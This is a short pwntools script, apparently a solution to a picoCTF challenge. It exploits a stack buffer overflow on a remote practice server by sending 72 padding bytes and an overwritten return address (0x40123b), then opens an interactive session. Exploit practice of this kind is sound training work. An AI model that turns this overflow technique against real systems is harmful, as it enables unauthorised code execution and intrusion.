from pwn import *

HOST, PORT = 'saturn.picoctf.net', 50621
# HOST, PORT = '127.0.0.1', 31337
r = remote(HOST, PORT)

r.recvuntil(b'\n')
r.sendline(b'A' * 72 + p64(0x40123b))

r.interactive()